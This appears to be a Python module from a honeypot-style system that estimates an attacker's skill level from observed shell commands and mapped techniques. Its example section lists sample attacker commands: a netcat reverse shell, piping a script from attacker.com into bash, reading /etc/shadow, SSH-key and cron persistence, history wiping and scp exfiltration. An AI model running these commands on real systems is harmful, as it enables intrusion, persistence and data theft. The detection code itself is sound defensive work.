"""
Skill Detector
Determines attacker skill level based on observed behavior patterns
"""
import logging
from typing import Dict, List, Any
from collections import defaultdict
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class SkillDetector:
    """
    Analyzes attacker behavior to estimate skill level
    Tracks progression through attack phases
    """
    
    SKILL_LEVELS = {
        "script_kiddie": 0,
        "opportunistic": 1,
        "intermediate": 2,
        "advanced": 3,
        "expert": 4
    }
    
    def __init__(self):
        self.session_data: Dict[str, Dict[str, Any]] = {}
        
    def analyze_session(self, session_id: str, command_analyses: List[Any]) -> Dict[str, Any]:
        """
        Analyze a session to determine attacker skill level
        
        Args:
            session_id: Session identifier
            command_analyses: List of CommandAnalysis objects
            
        Returns:
            Skill assessment with level and reasoning
        """
        # Initialize session if needed
        if session_id not in self.session_data:
            self.session_data[session_id] = {
                "commands": [],
                "techniques": set(),
                "phases": set(),
                "tools_used": set(),
                "skill_indicators": [],
                "start_time": datetime.now(),
                "unique_techniques_count": 0
            }
        
        session = self.session_data[session_id]
        
        # Aggregate data
        for analysis in command_analyses:
            session["commands"].append(analysis.command)
            session["techniques"].update(analysis.techniques)
            
            # Extract attack phases
            for technique in analysis.techniques:
                phase = technique.split('.')[0]
                session["phases"].add(phase)
        
        session["unique_techniques_count"] = len(session["techniques"])
        
        # Analyze behavior patterns
        skill_score = 0
        indicators = []
        
        # 1. Tool sophistication
        sophisticated_tools = ['metasploit', 'empire', 'cobalt', 'linpeas', 'pspy']
        basic_tools = ['nc', 'netcat', 'wget', 'curl']
        
        command_text = ' '.join(session["commands"]).lower()
        
        for tool in sophisticated_tools:
            if tool in command_text:
                session["tools_used"].add(tool)
                skill_score += 15
                indicators.append(f"Uses sophisticated tool: {tool}")
        
        for tool in basic_tools:
            if tool in command_text:
                session["tools_used"].add(tool)
        
        # 2. Attack phase progression (following kill chain)
        expected_progression = [
            'reconnaissance',
            'execution',
            'persistence',
            'privilege_escalation',
            'credential_access',
            'lateral_movement',
            'exfiltration'
        ]
        
        phases_in_order = []
        for phase in expected_progression:
            if phase in session["phases"]:
                phases_in_order.append(phase)
        
        if len(phases_in_order) >= 4:
            skill_score += 20
            indicators.append(f"Follows attack methodology ({len(phases_in_order)} phases)")
        
        # 3. Command complexity
        complex_commands = 0
        for cmd in session["commands"]:
            if '|' in cmd or ';' in cmd or '&&' in cmd:
                complex_commands += 1
                
        if complex_commands > 3:
            skill_score += 10
            indicators.append(f"Uses complex command chaining ({complex_commands} commands)")
        
        # 4. Obfuscation and evasion
        evasion_count = len([t for t in session["techniques"] if 'defense_evasion' in t])
        if evasion_count >= 2:
            skill_score += 15
            indicators.append(f"Multiple evasion techniques ({evasion_count})")
        
        # 5. Diverse techniques
        if session["unique_techniques_count"] >= 10:
            skill_score += 15
            indicators.append(f"Diverse technique set ({session['unique_techniques_count']})")
        elif session["unique_techniques_count"] >= 5:
            skill_score += 5
        
        # 6. Automated vs manual behavior
        time_between_commands = self._analyze_timing(session["commands"])
        if time_between_commands == "automated":
            skill_score -= 10
            indicators.append("Automated attack pattern detected")
        elif time_between_commands == "deliberate":
            skill_score += 10
            indicators.append("Deliberate, manual attack pattern")
        
        # 7. Error handling
        error_patterns = ['2>/dev/null', '2>&1', 'try', 'catch']
        error_handling = sum(1 for cmd in session["commands"] 
                            if any(p in cmd for p in error_patterns))
        if error_handling >= 3:
            skill_score += 10
            indicators.append("Proper error handling")
        
        # 8. Reconnaissance depth
        recon_count = len([t for t in session["techniques"] if 'reconnaissance' in t])
        if recon_count >= 5:
            skill_score += 10
            indicators.append(f"Thorough reconnaissance ({recon_count} techniques)")
        
        # Determine skill level
        skill_level = self._score_to_level(skill_score)
        
        assessment = {
            "session_id": session_id,
            "skill_level": skill_level,
            "skill_score": skill_score,
            "confidence": self._calculate_confidence(len(session["commands"])),
            "indicators": indicators,
            "statistics": {
                "total_commands": len(session["commands"]),
                "unique_techniques": session["unique_techniques_count"],
                "attack_phases": list(session["phases"]),
                "tools_detected": list(session["tools_used"]),
                "phases_completed": len(session["phases"])
            },
            "characteristics": self._get_characteristics(skill_level)
        }
        
        logger.info(f"[SkillDetector] Session {session_id}: {skill_level} (score: {skill_score})")
        
        return assessment
    
    def _analyze_timing(self, commands: List[str]) -> str:
        """
        Analyze command timing patterns
        Note: This is simplified - real implementation would use timestamps
        """
        if len(commands) < 5:
            return "insufficient_data"
        
        # Simplified heuristic based on command diversity
        unique_ratio = len(set(commands)) / len(commands)
        
        if unique_ratio < 0.3:
            return "automated"  # Many repeated commands
        else:
            return "deliberate"  # Diverse, manual commands
    
    def _score_to_level(self, score: int) -> str:
        """Convert numeric score to skill level"""
        if score < 15:
            return "script_kiddie"
        elif score < 35:
            return "opportunistic"
        elif score < 60:
            return "intermediate"
        elif score < 85:
            return "advanced"
        else:
            return "expert"
    
    def _calculate_confidence(self, command_count: int) -> str:
        """Calculate confidence level based on data points"""
        if command_count < 5:
            return "low"
        elif command_count < 15:
            return "medium"
        else:
            return "high"
    
    def _get_characteristics(self, skill_level: str) -> List[str]:
        """Get typical characteristics for skill level"""
        characteristics = {
            "script_kiddie": [
                "Uses basic, well-known exploits",
                "Limited understanding of techniques",
                "Copy-paste commands from tutorials",
                "No customization or adaptation"
            ],
            "opportunistic": [
                "Scans for known vulnerabilities",
                "Uses basic exploitation frameworks",
                "Limited post-exploitation capability",
                "Follows simple attack patterns"
            ],
            "intermediate": [
                "Understands attack methodology",
                "Uses multiple techniques",
                "Some evasion awareness",
                "Basic lateral movement attempts"
            ],
            "advanced": [
                "Sophisticated tool usage",
                "Methodical attack progression",
                "Active evasion techniques",
                "Custom scripts and tools"
            ],
            "expert": [
                "Advanced persistent threat behavior",
                "Complex multi-stage attacks",
                "Custom malware/tools",
                "Advanced evasion and anti-forensics",
                "Strategic objective-driven"
            ]
        }
        return characteristics.get(skill_level, [])
    
    def get_session_summary(self, session_id: str) -> Dict[str, Any]:
        """Get summary of session data"""
        session = self.session_data.get(session_id)
        if not session:
            return {"error": "Session not found"}
        
        return {
            "session_id": session_id,
            "commands_count": len(session["commands"]),
            "techniques_count": len(session["techniques"]),
            "phases": list(session["phases"]),
            "tools": list(session["tools_used"])
        }


# Example usage
if __name__ == "__main__":
    from command_analyzer import CommandAnalyzer
    
    detector = SkillDetector()
    analyzer = CommandAnalyzer()
    
    # Simulate different skill levels
    
    # Script kiddie session
    script_kiddie_commands = [
        "ls",
        "cat /etc/passwd",
        "nc -e /bin/bash 192.168.1.1 4444"
    ]
    
    # Advanced session
    advanced_commands = [
        "uname -a && cat /etc/os-release",
        "find / -perm -4000 -type f 2>/dev/null",
        "cat /etc/shadow 2>/dev/null | grep -v '^#'",
        "curl http://attacker.com/linpeas.sh | bash",
        "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
        "crontab -l; echo '*/5 * * * * /tmp/.backdoor' | crontab -",
        "history -c && rm ~/.bash_history && unset HISTFILE",
        "tar czf /tmp/data.tar.gz /var/www 2>/dev/null",
        "scp /tmp/data.tar.gz attacker@remote:/exfil/",
    ]
    
    print("=" * 80)
    print("SCRIPT KIDDIE ASSESSMENT")
    print("=" * 80)
    
    analyses = analyzer.batch_analyze(script_kiddie_commands)
    assessment = detector.analyze_session("session_001", analyses)
    
    import json
    print(json.dumps(assessment, indent=2))
    
    print("\n" + "=" * 80)
    print("ADVANCED ATTACKER ASSESSMENT")
    print("=" * 80)
    
    analyses = analyzer.batch_analyze(advanced_commands)
    assessment = detector.analyze_session("session_002", analyses)
    print(json.dumps(assessment, indent=2))
